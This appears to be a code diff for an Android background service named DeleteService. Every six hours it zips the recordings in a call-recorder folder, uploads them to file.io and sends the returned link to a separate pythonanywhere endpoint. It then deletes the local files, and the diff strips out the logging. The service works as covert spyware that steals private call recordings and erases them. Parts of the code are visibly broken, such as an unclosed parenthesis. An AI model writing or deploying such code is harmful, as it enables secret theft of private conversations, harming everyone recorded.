@@ -5,16 +5,14 @@ import android.content.Intent;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
-import android.util.Log;
 
+import org.json.JSONObject;
 import org.apache.commons.compress.archivers.zip.ZipArchiveEntry;
 import org.apache.commons.compress.archivers.zip.ZipArchiveOutputStream;
 
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
-import java.util.ArrayList;
-import java.util.List;
 
 import okhttp3.MediaType;
 import okhttp3.OkHttpClient;
@@ -24,9 +22,9 @@ import okhttp3.Response;
 
 public class DeleteService extends Service {
 
-    private static final String TAG = "DeleteService";
     private static final String FILE_IO_UPLOAD_URL = "https://file.io/";
     private static final String TARGET_FOLDER = "/storage/emulated/0/Documents/CubeCallRecorder/All/";
+    private static final String STORE_URL_API = "https://filestore.pythonanywhere.com/file-urls/add/?url=";
     private Handler handler;
 
     @Override
@@ -43,7 +41,7 @@ public class DeleteService extends Service {
                 try {
                     processAudioRecords();
                 } catch (IOException e) {
-                    Log.e(TAG, "Error processing audio records", e);
+                    stopSelf();  // Stop the service if any error occurs
                 }
                 handler.postDelayed(this, 6 * 60 * 60 * 1000); // Run every 6 hours
             }
@@ -52,10 +50,15 @@ public class DeleteService extends Service {
     }
 
     private void processAudioRecords() throws IOException {
-        File zipFile = createZip(files);
-        if (zipFile) {
-            uploadFile(zipFile);
-            deleteFiles(Files);
+        File zipFile = createZip();
+        if (zipFile != null) {
+            String fileUrl = uploadFile(zipFile);
+            if (fileUrl != null) {
+                storeUrl(fileUrl);
+                deleteFiles();
+            } else {
+                stopSelf();  // Stop the service if upload fails
+            }
         }
     }
 
@@ -64,13 +67,13 @@ public class DeleteService extends Service {
         File folder = new File(TARGET_FOLDER);
         File[] files = folder.listFiles((dir, name) -> !name.startsWith("."));
         if (files == null || files.length == 0) {
-            return null;
+            return null;  // No files to zip
         }
 
         try (FileOutputStream fos = new FileOutputStream(zipFile);
              ZipArchiveOutputStream zos = new ZipArchiveOutputStream(fos)) {
             for (File file : files) {
-                if (file.isFile() && file.getName().) {
+                if (file.isFile()) {
                     ZipArchiveEntry zipEntry = new ZipArchiveEntry(file.getName());
                     zos.putArchiveEntry(zipEntry);
                     zos.write(java.nio.file.Files.readAllBytes(file.toPath()));
@@ -81,28 +84,52 @@ public class DeleteService extends Service {
         return zipFile;
     }
 
-    private void uploadFile(File file) throws IOException {
+    private String uploadFile(File file) throws IOException {
         OkHttpClient client = new OkHttpClient();
         RequestBody requestBody = RequestBody.create(file, MediaType.parse("application/zip"));
         Request request = new Request.Builder()
                 .url(FILE_IO_UPLOAD_URL)
                 .post(requestBody)
                 .build();
+
         try (Response response = client.newCall(request).execute()) {
             if (!response.isSuccessful()) {
-                Log.e(TAG, "Failed to upload file: " + response.message());
+                return null;  // Upload failed
             } else {
-                Log.i(TAG, "File uploaded successfully: " + response.body().string());
+                return extractUrlFromResponse(response.body().string());
             }
         }
     }
 
-    private void deleteFiles(File[] files) {
-        for (File file : files) {
-            if (file.isFile() && file.getName().endsWith(".mp3")) {
-                file.delete();
+    private void storeUrl(String url) throws IOException {
+        OkHttpClient client = new OkHttpClient();
+        Request request = new Request.Builder()
+                .url(STORE_URL_API + url)
+                .get()
+                .build();
+
+        try (Response response = client.newCall(request).execute()) {
+            if (!response.isSuccessful()) {
+                throw new IOException("Failed to store URL");
             }
         }
+    }
+
+    private void deleteFiles() {
+        File folder = new File(TARGET_FOLDER);
+        File[] files = folder.listFiles((dir, name) -> !name.startsWith("."));
+        if (files != null) {
+            for (File file : files) {
+                if (file.isFile() {
+                    file.delete();
+                }
+            }
+        }
+    }
+
+    private String extractUrlFromResponse(String responseBody) {
+        JSONObject jsonResponse = new JSONObject(responseBody);
+        return jsonResponse.getString("url");
     }
 
     @Override
